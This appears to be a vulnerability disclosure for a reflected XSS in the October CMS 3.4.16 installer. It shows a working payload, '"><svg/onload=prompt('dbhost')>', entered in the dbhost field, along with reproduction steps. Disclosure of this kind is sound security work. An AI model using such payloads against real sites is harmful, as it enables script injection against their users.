# October CMS Reflected XSS v3.4.16

## Author: (Sergio)

**Description:** Cross-Site Scripting (XSS) vulnerabilitiy in installation of October v.3.4.16 allows a local attacker to execute arbitrary web scripts via a crafted payload injected into the dbhost field.

**Attack Vectors:** A vulnerability in the installation sanitation in the dbhost field allows JavaScript code to be injected.

---

### POC:


During the installation process we enter the XSS payload in dbhost field and when we click on next, we will obtain the XSS pop-up

### XSS Payload:

```js
'"><svg/onload=prompt('dbhost')>
```

![XSS Dbhost payload](https://github.com/sromanhu/October-CMS-Reflected-XSS---Installation/assets/87250597/d1f9df46-b006-46b0-b357-f5dfca3a032b)


In the following image you can see the embedded code that executes the payload in the instalaltion process.



![dbhost](https://github.com/sromanhu/October-CMS-Reflected-XSS---Installation/assets/87250597/5a91c13b-1d0e-45cc-9c42-0102ca1d1047)



</br>

### Additional Information:

https://octobercms.com/

https://owasp.org/Top10/es/A03_2021-Injection/

